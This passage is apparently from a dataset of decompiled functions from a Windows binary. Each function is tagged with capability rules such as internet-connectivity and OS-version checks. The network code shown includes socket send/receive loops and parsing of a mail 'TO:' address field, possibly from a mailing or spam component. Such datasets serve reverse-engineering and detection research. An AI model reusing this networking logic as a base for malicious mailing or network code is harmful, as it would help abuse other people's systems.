== 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                    goto code_r0x0004c381;\n                }\n            }\n        }\n        var_20h = 1;\n        if (var_1ch < 1) {\n            var_20h = -1;\n        }\n    }\n    if (var_20h != 0) {\n        return 0;\n    }\n    puVar2 = fcn.00078b7c(arg_8h + 5, 0x3f, arg_ch - 0x18);\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    if (puVar2[0xb] != 0x26) {\n        return 0;\n    }\n    uVar1 = puVar2[0xc];\n    var_6h = 0;\n    for (var_ch = 0; var_4h = puVar2 + 1,  var_ch < 8; var_ch = var_ch + 1) {\n        var_6h = var_6h + *var_4h;\n        puVar2 = var_4h;\n    }\n    if (*var_4h != var_6h / 0x1a + 0x41) {\n        return 0;\n    }\n    if (puVar2[2] != 0x7a - var_6h % 0x1a) {\n        return 0;\n    }\n    iVar3 = fcn.00078b7c(puVar2 + 4, 0x20, arg_ch - 0x17);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    var_2ch = 0x80055258;\n    var_30h = iVar3 + 1;\n    for (var_28h = 5; 3 < var_28h; var_28h = var_28h - 4) {\n        if (*var_30h != *var_2ch) goto code_r0x0004c4d6;\n        var_2ch = var_2ch + 1;\n        var_30h = var_30h + 1;\n    }\n    if (var_28h == 0) {\ncode_r0x0004c558:\n        var_38h = 0;\n    }\n    else {\ncode_r0x0004c4d6:\n        var_34h = *var_30h - *var_2ch;\n        if (var_34h == 0) {\n            if (var_28h == 1) goto code_r0x0004c558;\n            var_34h = *(var_30h + 1) - *(var_2ch + 1);\n            if (var_34h == 0) {\n                if (var_28h == 2) goto code_r0x0004c558;\n                var_34h = *(var_30h + 2) - *(var_2ch + 2);\n                if (var_34h == 0) {\n                    if ((var_28h == 3) || (var_34h = *(var_30h + 3) - *(var_2ch + 3),  var_34h == 0))\n                    goto code_r0x0004c558;\n                }\n            }\n        }\n        var_38h = 1;\n        if (var_34h < 1) {\n            var_38h = -1;\n        }\n    }\n    if (var_38h != 0) {\n        return 0;\n    }\n    return 7 - (uVar1 != 0x61);\n}\n",
        "token_count": 1348
    },
    "0004c5d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0004c5d0(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint var_174h;\n    uint var_16ch;\n    uint *var_168h;\n    uint *var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_150h;\n    uint *var_14ch;\n    uint var_148h;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_c8h = arg_8h;\n    var_bch = 0;\n    var_b8h = 0;\n    var_ach = 0;\n    fcn.0002c3f0(&var_a8h, 0x73);\n    if (*(var_c8h + 0x18) != 1) {\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        var_4h._0_1_ = 0;\n        fcn.0002c4c0(&var_24h, 0x20, 0x8005543c, *(var_c8h + 0x18) + -1);\n        var_14ch = &var_24h;\n        do {\n            cVar2 = *var_14ch;\n            var_14ch = var_14ch + 1;\n        } while (cVar2 != '\\0');\n        uVar3 = var_14ch - &var_24h;\n        var_160h = &var_ach + 3;\n        do {\n            pcVar1 = var_160h + 1;\n            var_160h = var_160h + 1;\n        } while (*pcVar1 != '\\0');\n        puVar6 = &var_24h;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *var_160h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_160h = var_160h + 1;\n        }\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *var_160h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_160h = var_160h + 1;\n        }\n    }\n    var_168h = &var_a8h;\n    do {\n        cVar2 = *var_168h;\n        var_168h = var_168h + 1;\n    } while (cVar2 != '\\0');\n    var_c4h = fcn.00075eb0(&var_2ch, 0x800cad10, 0, 0, &var_a8h, var_168h + (1 - (&var_a8h + 1)), 2);\n    if (var_c4h == 0) {\n        fcn.00078bfa(&var_148h, 0, 0x80);\n        fcn.0002c4c0(&var_148h, 0x7f, 0x80055440, *(var_c8h + 0x20));\n        var_c4h = fcn.000766e0(var_2ch, &var_148h, 0);\n        if ((var_c4h == 0) && (var_c4h = fcn.00076560(var_2ch, 0),  var_c4h == 0)) {\n            var_b4h = var_2ch;\n            var_b0h = *(var_c8h + 0x10);\n            var_ach = *(var_c8h + 0x14);\n            var_c4h = fcn.0001ace0(&var_bch, 0x8008ca50, &var_b4h);\n            if (var_c4h == 0) {\n                if (*(var_c8h + 0x1c) != 0) {\n                    var_28h = fcn.000356c0(*(var_c8h + 0x1c));\n                    if (var_28h == 0) goto code_r0x0004c9dc;\n                    var_c4h = fcn.0004cb50(*(var_c8h + 0x10), *(var_c8h + 0x14), var_28h, *(var_c8h + 0x1c), 300000);\n                    fcn.000357f0(var_28h);\n                    if (var_c4h != 0) goto code_r0x0004c9dc;\n                }\n                do {\n                    var_c4h = fcn.0004cb50(*(var_c8h + 0x10), *(var_c8h + 0x14), &var_c0h, 4, 300000);\n                    if (var_c4h != 0) break;\n                    var_c0h = fcn.00035950(var_c0h);\n                    var_28h = fcn.000356c0(var_c0h);\n                    if (var_28h == 0) break;\n                    var_c4h = fcn.0004cb50(*(var_c8h + 0x10), *(var_c8h + 0x14), var_28h, var_c0h, 300000);\n                    if (var_c4h != 0) {\n                        fcn.000357f0(var_28h);\n                        break;\n                    }\n                    var_c4h = fcn.000767a0(var_2ch, var_28h, var_c0h, 0);\n                    fcn.000357f0(var_28h);\n                } while (var_c4h == 0);\n            }\n        }\n    }\ncode_r0x0004c9dc:\n    fcn.000761d0(&var_2ch, 0);\n    iVar4 = fcn.00037730(&var_bch);\n    if (iVar4 == 0) {\n        if (var_ach != 0) {\n            fcn.000531d0(*(var_c8h + 0x10), *(var_c8h + 0x14));\n        }\n    }\n    else {\n        fcn.00037760(&var_bch, 0);\n        fcn.00037710(&var_bch);\n    }\n    fcn.00053350(var_c8h);\n    return 0;\n}\n",
        "token_count": 1669
    },
    "0004ca50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0004ca50(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    do {\n        iVar1 = fcn.00076860(*var_8h, &var_4h, &var_ch, 0xffffffff, 0);\n        if (iVar1 != 0) {\ncode_r0x0004cb15:\n            if (var_8h[2] != 0) {\n                fcn.000531d0(var_8h[1], var_8h[2]);\n                var_8h[2] = 0;\n            }\n            return 0;\n        }\n        var_ch = fcn.00035950(var_ch);\n        iVar1 = fcn.00053270(var_8h[1], var_8h[2], &var_ch, 4);\n        if (iVar1 != 0) {\n            fcn.00076a80(*var_8h, var_4h);\n            goto code_r0x0004cb15;\n        }\n        var_ch = fcn.00035950(var_ch);\n        iVar1 = fcn.00053270(var_8h[1], var_8h[2], var_4h, var_ch);\n        if (iVar1 != 0) {\n            fcn.00076a80(*var_8h, var_4h);\n            goto code_r0x0004cb15;\n        }\n        fcn.00076a80(*var_8h, var_4h);\n    } while( true );\n}\n",
        "token_count": 407
    },
    "0004cb50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0004cb50(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_8h = 0; var_8h < arg_14h; var_8h = var_8h + var_4h) {\n        iVar1 = fcn.000532b0(arg_8h, arg_ch, arg_10h + var_8h, arg_14h - var_8h, &var_4h, arg_18h);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (var_4h == 0) break;\n    }\n    if (var_8h == arg_14h) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 283
    },
    "0004cbc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0004cc49)\n// WARNING: Removing unreachable block (ram,0x0004cc60)\n// WARNING: Removing unreachable block (ram,0x0004cc69)\n// WARNING: Switch with 1 destination removed at 0x0004cc08\n\nvoid __cdecl fcn.0004cbc0(int32_t arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00053300(*(arg_8h + 0x28), *(arg_8h + 0x2c), *(arg_8h + 0x30));\n    if (*(arg_8h + 0x18) - 1U < 0xb) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00053330(*(arg_8h + 0x10), *(arg_8h + 0x14));\n    fcn.00053350(arg_8h);\n    return;\n}\n",
        "token_count": 253
    },
    "0004ccc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004ccc0(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint8_t *arg_8h_00;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    int32_t *var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (arg_ch < 0xd) {\n        return 0;\n    }\n    var_10h = 0x80055478;\n    var_14h = arg_8h;\n    for (var_ch = 5; 3 < var_ch; var_ch = var_ch - 4) {\n        if (*var_14h != *var_10h) goto code_r0x0004cd11;\n        var_10h = var_10h + 1;\n        var_14h = var_14h + 1;\n    }\n    if (var_ch == 0) {\ncode_r0x0004cd93:\n        var_1ch = 0;\n    }\n    else {\ncode_r0x0004cd11:\n        var_18h = *var_14h - *var_10h;\n        if (var_18h == 0) {\n            if (var_ch == 1) goto code_r0x0004cd93;\n            var_18h = *(var_14h + 1) - *(var_10h + 1);\n            if (var_18h == 0) {\n                if (var_ch == 2) goto code_r0x0004cd93;\n                var_18h = *(var_14h + 2) - *(var_10h + 2);\n                if (var_18h == 0) {\n                    if ((var_ch == 3) || (var_18h = *(var_14h + 3) - *(var_10h + 3),  var_18h == 0))\n                    goto code_r0x0004cd93;\n                }\n            }\n        }\n        var_1ch = 1;\n        if (var_18h < 1) {\n            var_1ch = -1;\n        }\n    }\n    if (var_1ch == 0) goto code_r0x0004cff2;\n    var_28h = 0x80055480;\n    var_2ch = arg_8h;\n    for (var_24h = 5; 3 < var_24h; var_24h = var_24h - 4) {\n        if (*var_2ch != *var_28h) goto code_r0x0004cdfe;\n        var_28h = var_28h + 1;\n        var_2ch = var_2ch + 1;\n    }\n    if (var_24h == 0) {\ncode_r0x0004ce80:\n        var_34h = 0;\n    }\n    else {\ncode_r0x0004cdfe:\n        var_30h = *var_2ch - *var_28h;\n        if (var_30h == 0) {\n            if (var_24h == 1) goto code_r0x0004ce80;\n            var_30h = *(var_2ch + 1) - *(var_28h + 1);\n            if (var_30h == 0) {\n                if (var_24h == 2) goto code_r0x0004ce80;\n                var_30h = *(var_2ch + 2) - *(var_28h + 2);\n                if (var_30h == 0) {\n                    if ((var_24h == 3) || (var_30h = *(var_2ch + 3) - *(var_28h + 3),  var_30h == 0))\n                    goto code_r0x0004ce80;\n                }\n            }\n        }\n        var_34h = 1;\n        if (var_30h < 1) {\n            var_34h = -1;\n        }\n    }\n    if (var_34h != 0) {\n        return 0;\n    }\n    iVar1 = fcn.00078b7c(arg_8h, 10, arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    piVar3 = iVar1 + 1;\n    arg_ch = arg_ch - (piVar3 - arg_8h);\n    if (arg_ch < 0xd) {\n        return 0;\n    }\n    var_40h = 0x80055478;\n    var_44h = piVar3;\n    for (var_3ch = 5; 3 < var_3ch; var_3ch = var_3ch - 4) {\n        if (*var_44h != *var_40h) goto code_r0x0004cf37;\n        var_40h = var_40h + 1;\n        var_44h = var_44h + 1;\n    }\n    if (var_3ch == 0) {\ncode_r0x0004cfb9:\n        var_4ch = 0;\n    }\n    else {\ncode_r0x0004cf37:\n        var_48h = *var_44h - *var_40h;\n        if (var_48h == 0) {\n            if (var_3ch == 1) goto code_r0x0004cfb9;\n            var_48h = *(var_44h + 1) - *(var_40h + 1);\n            if (var_48h == 0) {\n                if (var_3ch == 2) goto code_r0x0004cfb9;\n                var_48h = *(var_44h + 2) - *(var_40h + 2);\n                if (var_48h == 0) {\n                    if ((var_3ch == 3) || (var_48h = *(var_44h + 3) - *(var_40h + 3),  var_48h == 0))\n                    goto code_r0x0004cfb9;\n                }\n            }\n        }\n        var_4ch = 1;\n        if (var_48h < 1) {\n            var_4ch = -1;\n        }\n    }\n    arg_8h = piVar3;\n    if (var_4ch != 0) {\n        return 0;\n    }\ncode_r0x0004cff2:\n    iVar1 = fcn.000364a0(*(arg_8h + 5));\n    if (((iVar1 == 0x54) && (iVar1 = fcn.000364a0(*(arg_8h + 6)),  iVar1 == 0x4f)) && (*(arg_8h + 7) == 0x3a)) {\n        var_4h = arg_8h + 2;\n        for (arg_ch = arg_ch - 8; (*var_4h == 0x20 && (arg_ch != 0)); arg_ch = arg_ch - 1) {\n            var_4h = var_4h + 1;\n        }\n        if (arg_ch < 4) {\n            uVar2 = 0;\n        }\n        else if (*var_4h == 0x3c) {\n            arg_8h_00 = var_4h + 1;\n            iVar1 = fcn.00078b7c(arg_8h_00, 0x40, arg_ch - 1);\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else if (iVar1 - arg_8h_00 == 10) {\n                uVar2 = fcn.00037ea0(arg_8h_00);\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 1943
    },
    "0004d0d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004d0d0(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    uint var_2c0h;\n    uint var_2b8h;\n    uint *var_2b4h;\n    uint var_2b0h;\n    uint var_2a8h;\n    uint *var_2a4h;\n    uint var_2a0h;\n    int32_t var_29ch;\n    uint *var_294h;\n    uint8_t *var_290h;\n    uint var_28ch;\n    uint var_284h;\n    uint *var_280h;\n    uint var_27ch;\n    uint var_274h;\n    char *var_270h;\n    uint var_26ch;\n    uint var_264h;\n    uint *var_260h;\n    int32_t var_25ch;\n    uint var_258h;\n    uint var_250h;\n    uint *var_24ch;\n    uint var_248h;\n    int32_t var_244h;\n    uint8_t *var_23ch;\n    uint8_t *var_238h;\n    uint var_234h;\n    uint var_22ch;\n    uint *var_228h;\n    uint *var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_210h;\n    uint *var_20ch;\n    uint var_208h;\n    uint var_200h;\n    uint *var_1fch;\n    uint var_1f8h;\n    uint var_1f0h;\n    char *var_1ech;\n    uint var_1e8h;\n    int32_t var_1e4h;\n    uint *var_1dch;\n    uint8_t *var_1d8h;\n    uint var_1d4h;\n    int32_t var_1d0h;\n    uint *var_1c8h;\n    uint8_t *var_1c4h;\n    uint var_1c0h;\n    uint var_1b8h;\n    uint *var_1b4h;\n    uint var_1b0h;\n    int32_t var_1ach;\n    uint *var_1a4h;\n    uint8_t *var_1a0h;\n    uint var_19ch;\n    uint var_194h;\n    uint *var_190h;\n    uint var_18ch;\n    uint var_184h;\n    uint *var_180h;\n    uint var_17ch;\n    int32_t var_178h;\n    int32_t var_174h;\n    int32_t *var_170h;\n    int32_t *var_16ch;\n    uint32_t var_168h;\n    uint var_164h;\n    uint var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    int32_t var_150h;\n    int32_t var_14ch;\n    int32_t *var_148h;\n    int32_t *var_144h;\n    uint32_t var_140h;\n    uint var_13ch;\n    int32_t var_124h;\n    int32_t var_120h;\n    int32_t var_11ch;\n    uint var_118h;\n    uint var_113h;\n    uint32_t var_98h;\n    int32_t var_94h;\n    uint32_t var_90h;\n    char *var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    uint *var_8h;\n    uint8_t *var_4h;\n    \n    var_120h = arg_8h;\n    var_8ch = NULL;\n    fcn.00078ad4(&var_13ch, 0x80055268, *(arg_8h + 0x20), *(arg_8h + 0x21), *(arg_8h + 0x22), *(arg_8h + 0x23), \n                 *(arg_8h + 0x24));\n    var_8h = fcn.000356c0(0xbd0);\n    if (var_8h == NULL) goto code_r0x0004e101;\n    fcn.00078bfa(var_8h, 0, 0xbd0);\n    *var_8h = *(var_120h + 0x10);\n    var_8h[1] = *(var_120h + 0x14);\n    if (3000 < *(var_120h + 0x610)) goto code_r0x0004e101;\n    var_8h[3] = 0;\n    var_8h[2] = *(var_120h + 0x610) % 3000;\n    var_8h[4] = *(var_120h + 0x610);\n    fcn.00078be8(var_8h + 5, var_120h + 0x34, *(var_120h + 0x610));\n    var_8ch = fcn.000356c0(0x2000);\n    if ((var_8ch == NULL) || (iVar4 = fcn.0004e150(var_8h, &var_118h, 0x80),  iVar4 == 0)) goto code_r0x0004e101;\n    var_144h = 0x80055480;\n    var_148h = &var_118h;\n    for (var_140h = 5; 3 < var_140h; var_140h = var_140h - 4) {\n        if (*var_148h != *var_144h) goto code_r0x0004d296;\n        var_144h = var_144h + 1;\n        var_148h = var_148h + 1;\n    }\n    if (var_140h == 0) {\ncode_r0x0004d36c:\n        var_150h = 0;\n    }\n    else {\ncode_r0x0004d296:\n        var_14ch = *var_148h - *var_144h;\n        if (var_14ch == 0) {\n            if (var_140h == 1) goto code_r0x0004d36c;\n            var_14ch = *(var_148h + 1) - *(var_144h + 1);\n            if (var_14ch == 0) {\n                if (var_140h == 2) goto code_r0x0004d36c;\n                var_14ch = *(var_148h + 2) - *(var_144h + 2);\n                if (var_14ch == 0) {\n                    if ((var_140h == 3) || (var_14ch = *(var_148h + 3) - *(var_144h + 3),  var_14ch == 0))\n                    goto code_r0x0004d36c;\n                }\n            }\n        }\n        var_150h = 1;\n        if (var_14ch < 1) {\n            var_150h = -1;\n        }\n    }\n    if (var_150h == 0) {\n        var_88h = *0x80055488;\n        var_84h = *0x8005548c;\n        var_80h = *0x80055490;\n        var_7ch = *0x80055494;\n        var_158h = &var_88h;\n        do {\n            cVar2 = *var_158h;\n            var_158h = var_158h + 1;\n        } while (cVar2 != '\\0');\n        fcn.00053270(*var_8h, var_8h[1], &var_88h, var_158h - (&var_88h + 1));\n        iVar4 = fcn.0004e150(var_8h, &var_118h, 0x80);\n        if (iVar4 == 0) goto code_r0x0004e101;\n    }\n    var_16ch = 0x80055478;\n    var_170h = &var_118h;\n    for (var_168h = 5; 3 < var_168h; var_168h = var_168h - 4) {\n        if (*var_170h != *var_16ch) goto code_r0x0004d4bf;\n        var_16ch = var_16ch + 1;\n        var_170h = var_170h + 1;\n    }\n    if (var_168h == 0) {\ncode_r0x0004d595:\n        var_178h = 0;\n    }\n    else {\ncode_r0x0004d4bf:\n        var_174h = *var_170h - *var_16ch;\n        if (var_174h == 0) {\n            if (var_168h == 1) goto code_r0x0004d595;\n            var_174h = *(var_170h + 1) - *(var_16ch + 1);\n            if (var_174h == 0) {\n                if (var_168h == 2) goto code_r0x0004d595;\n                var_174h = *(var_170h + 2) - *(var_16ch + 2);\n                if (var_174h == 0) {\n                    if ((var_168h == 3) || (var_174h = *(var_170h + 3) - *(var_16ch + 3),  var_174h == 0))\n                    goto code_r0x0004d595;\n                }\n            }\n        }\n        var_178h = 1;\n        if (var_174h < 1) {\n            var_178h = -1;\n        }\n    }\n    if (var_178h == 0) {\n        var_88h = *0x800554b8;\n        var_84h = *0x800554bc;\n        var_80h = var_80h & 0xffffff00 | *0x800554c0;\n        var_190h = &var_88h;\n        do {\n            cVar2 = *var_190h;\n            var_190h = var_190h + 1;\n        } while (cVar2 != '\\0');\n        var_11ch = fcn.00053270(*var_8h, var_8h[1], &var_88h, var_190h - (&var_88h + 1));\n        if ((var_11ch == 0) && (iVar4 = fcn.0004e150(var_8h, &var_118h, 0x80),  iVar4 != 0)) {\n            var_1a0h = 0x800554c4;\n            var_1a4h = &var_118h;\n            do {\n                uVar3 = *var_1a4h;\n                bVar9 = uVar3 < *var_1a0h;\n                if (uVar3 != *var_1a0h) {\ncode_r0x0004d78d:\n                    var_1ach = (1 - bVar9) - (bVar9 != 0);\n                    goto code_r0x0004d798;\n                }\n                if (uVar3 == 0) break;\n                uVar3 = *(var_1a4h + 1);\n                bVar9 = uVar3 < var_1a0h[1];\n                if (uVar3 != var_1a0h[1]) goto code_r0x0004d78d;\n                var_1a4h = var_1a4h + 2;\n                var_1a0h = var_1a0h + 2;\n            } while (uVar3 != 0);\n            var_1ach = 0;\ncode_r0x0004d798:\n            if (var_1ach == 0) {\n                puVar7 = 0x800554cc;\n                puVar8 = &var_88h;\n                for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = *puVar7;\n                var_1b4h = &var_88h;\n                do {\n                    cVar2 = *var_1b4h;\n                    var_1b4h = var_1b4h + 1;\n                } while (cVar2 != '\\0');\n                var_11ch = fcn.00053270(*var_8h, var_8h[1], &var_88h, var_1b4h - (&var_88h + 1));\n                if (var_11ch == 0) {\n                    var_124h = 0;\n                    *var_8ch = '\\0';\n                    while (iVar4 = fcn.0004e150(var_8h, &var_118h, 0x80),  iVar4 != 0) {\n                        var_1c4h = 0x800554f0;\n                        var_1c8h = &var_118h;\n                        do {\n                            uVar3 = *var_1c8h;\n                            bVar9 = uVar3 < *var_1c4h;\n                            if (uVar3 != *var_1c4h) {\ncode_r0x0004d8e9:\n                                var_1d0h = (1 - bVar9) - (bVar9 != 0);\n                                goto code_r0x0004d8f4;\n                            }\n                            if (uVar3 == 0) break;\n                            uVar3 = *(var_1c8h + 1);\n                            bVar9 = uVar3 < var_1c4h[1];\n                            if (uVar3 != var_1c4h[1]) goto code_r0x0004d8e9;\n                            var_1c8h = var_1c8h + 2;\n                            var_1c4h = var_1c4h + 2;\n                        } while (uVar3 != 0);\n                        var_1d0h = 0;\ncode_r0x0004d8f4:\n                        if (var_1d0h == 0) goto code_r0x0004de24;\n                        if (var_124h == 0) {\n                            var_1d8h = 0x800554f4;\n                            var_1dch = &var_118h;\n                            do {\n                                uVar3 = *var_1dch;\n                                bVar9 = uVar3 < *var_1d8h;\n                                if (uVar3 != *var_1d8h) {\ncode_r0x0004d98f:\n                                    var_1e4h = (1 - bVar9) - (bVar9 != 0);\n                                    goto code_r0x0004d99a;\n                                }\n                                if (uVar3 == 0) break;\n                                uVar3 = *(var_1dch + 1);\n                                bVar9 = uVar3 < var_1d8h[1];\n                                if (uVar3 != var_1d8h[1]) goto code_r0x0004d98f;\n                                var_1dch = var_1dch + 2;\n                                var_1d8h = var_1d8h + 2;\n                            } while (uVar3 != 0);\n                            var_1e4h = 0;\ncode_r0x0004d99a:\n                            if (var_1e4h == 0) {\n                                var_124h = 1;\n                            }\n                            else {\n                                var_1ech = var_8ch;\n                                do {\n                                    cVar2 = *var_1ech;\n                                    var_1ech = var_1ech + 1;\n                                } while (cVar2 != '\\0');\n                                var_1fch = &var_118h;\n                                do {\n                                    cVar2 = *var_1fch;\n                                    var_1fch = var_1fch + 1;\n                                } while (cVar2 != '\\0');\n                                if (var_1ech + var_1fch + (-(&var_118h + 1) - (var_8ch + 1)) < 0x2000) {\n                                    var_20ch = &var_118h;\n                                    do {\n                                        cVar2 = *var_20ch;\n                                        var_20ch = var_20ch + 1;\n                                    } while (cVar2 != '\\0');\n                                    uVar6 = var_20ch - &var_118h;\n                                    var_220h = var_8ch + -1;\n                                    do {\n                                        pcVar1 = var_220h + 1;\n                                        var_220h = var_220h + 1;\n                                    } while (*pcVar1 != '\\0');\n                                    puVar7 = &var_118h;\n                                    for (uVar5 = uVar6 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                                        *var_220h = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                        var_220h = var_220h + 1;\n                                    }\n                                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                                        *var_220h = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                        var_220h = var_220h + 1;\n                                    }\n                                }\n                                else {\n                                    var_124h = 1;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                var_228h = &var_118h;\n                do {\n                    cVar2 = *var_228h;\n                    var_228h = var_228h + 1;\n                } while (cVar2 != '\\0');\n                if ((var_228h - (&var_118h + 1) < 6) || (iVar4 = fcn.00078b88(&var_118h, 0x800554f8, 5),  iVar4 != 0)) {\n                    puVar7 = 0x80055538;\n                    puVar8 = &var_88h;\n                    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar8 = *puVar7;\n                        puVar7 = puVar7 + 1;\n                        puVar8 = puVar8 + 1;\n                    }\n                    *puVar8 = *puVar7;\n                    var_260h = &var_88h;\n                    do {\n                        cVar2 = *var_260h;\n                        var_260h = var_260h + 1;\n                    } while (cVar2 != '\\0');\n                    fcn.00053270(*var_8h, var_8h[1], &var_88h, var_260h - (&var_88h + 1));\n                }\n                else {\n                    var_98h = fcn.00036370(&var_113h, &var_4h, 10);\n                    var_238h = 0x80055500;\n                    var_23ch = var_4h;\n                    do {\n                        uVar3 = *var_23ch;\n                        bVar9 = uVar3 < *var_238h;\n                        if (uVar3 != *var_238h) {\ncode_r0x0004dc26:\n                            var_244h = (1 - bVar9) - (bVar9 != 0);\n                            goto code_r0x0004dc31;\n                        }\n                        if (uVar3 == 0) break;\n                        uVar3 = var_23ch[1];\n                        bVar9 = uVar3 < var_238h[1];\n                        if (uVar3 != var_238h[1]) goto code_r0x0004dc26;\n                        var_23ch = var_23ch + 2;\n                        var_238h = var_238h + 2;\n                    } while (uVar3 != 0);\n                    var_244h = 0;\ncode_r0x0004dc31:\n                    if (var_244h == 0) {\n                        var_90h = 0;\n                        do {\n                            if (var_90h < 0x1fff) {\n                                if (var_98h - var_90h < 0x1fff) {\n                                    var_25ch = var_98h - var_90h;\n                                }\n                                else {\n                                    var_25ch = 0x1fff;\n                                }\n                                iVar4 = fcn.0004b290(var_8h, var_8ch, var_25ch, &var_94h, 0);\n                            }\n                            else {\n                                iVar4 = fcn.0004b290(var_8h, &var_118h, 0x80, &var_94h, 0);\n                            }\n                            if (iVar4 == 0) goto code_r0x0004e101;\n                            var_90h = var_90h + var_94h;\n                        } while (var_90h < var_98h);\n                        var_8ch[var_90h] = '\\0';\ncode_r0x0004de24:\n                        var_270h = var_8ch;\n                        do {\n                            cVar2 = *var_270h;\n                            var_270h = var_270h + 1;\n                        } while (cVar2 != '\\0');\n                        iVar4 = fcn.0004b790(var_8ch, var_270h + (1 - (var_8ch + 1)), &var_13ch, 0, 0);\n                        if (iVar4 == 0) {\n                       